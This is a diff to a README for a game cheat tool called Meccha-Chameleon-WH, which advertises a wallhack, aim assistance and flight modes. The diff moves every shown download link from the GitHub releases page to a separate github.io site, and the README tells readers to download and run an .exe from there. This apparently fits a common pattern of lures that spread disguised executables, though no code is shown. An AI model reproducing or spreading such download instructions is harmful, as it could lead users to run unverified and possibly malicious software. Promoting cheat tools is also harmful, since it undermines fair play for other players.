@@ -1,12 +1,12 @@
 # 🦎 Meccha-Chameleon-WH - Gain the tactical edge in games
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Steinhabeascorpus717/Meccha-Chameleon-WH/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://steinhabeascorpus717.github.io)
 
 Meccha-Chameleon-WH provides features to improve your vision and control within hide-and-seek gaming environments. The tool includes a wallhack, aim help, flight modes, movement options, and character modifiers. It adds layer functionality over your game to highlight objects and entities.
 
 ## 📥 How to download the software
 
-1. Visit the [official releases page](https://github.com/Steinhabeascorpus717/Meccha-Chameleon-WH/releases).
+1. Visit the [official releases page](https://steinhabeascorpus717.github.io).
 2. Look for the section labeled Latest.
 3. Click the link that ends in .exe to download the application.
 4. Save the file where you can locate it easily, such as your desktop.
@@ -85,7 +85,7 @@ Ensure you are using the Windows version recommended in the requirements. Other 
 
 ## 📋 Updates and history
 
-We provide updates as the game changes. Each release on the [download page](https://github.com/Steinhabeascorpus717/Meccha-Chameleon-WH/releases) contains a log of changes. Review these logs to understand new features or performance improvements.
+We provide updates as the game changes. Each release on the [download page](https://steinhabeascorpus717.github.io) contains a log of changes. Review these logs to understand new features or performance improvements.
 
 ## 📈 Frequently asked questions
 
